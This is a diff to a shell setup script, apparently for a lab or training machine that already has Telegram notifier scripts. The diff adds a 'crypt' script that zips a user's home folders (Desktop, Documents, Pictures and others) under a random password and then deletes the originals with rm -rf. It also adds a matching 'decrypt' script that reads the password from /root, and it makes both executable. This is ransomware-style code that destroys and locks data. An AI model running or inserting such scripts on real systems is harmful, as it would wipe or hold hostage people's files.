@@ -556,8 +556,27 @@ done
 fi
 EOF
 
-chmod +x /openvpn_telegram /ports_telegram /ssh_telegram
+cat >crypt <<EOF
+#!/bin/bash
+cd /home/user3/
+password=\$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c\${1:-32};echo;)
+echo "Скопируйте пароль \$password\n"
+zip user.zip -r -P \$password Desktop/ Documents/ Downloads/ Music/ Pictures/ Public/ Templates/ Videos/
+rm -rf Desktop/ Documents/ Downloads/ Music/ Pictures/ Public/ Templates/ Videos/
+EOF
+
+cat >decrypt <<EOF
+#!/bin/bash
+cd /home/user3/
+password=\$(ls /root/ | grep "passwd" | sed 's/=/ /g' | awk '{print \$2}')
+unzip -P \$password user.zip
+file=\$(ls /root/ | grep "passwd")
+rm -f /root/\$file
+EOF
+
+chmod +x /openvpn_telegram /ports_telegram /ssh_telegram /crypt /decrypt
 cd ~
 #wget https://mirror.yandex.ru/ubuntu-cdimage/xubuntu/releases/20.04/release/xubuntu-20.04.3-desktop-amd64.iso
 
+adduser user
 
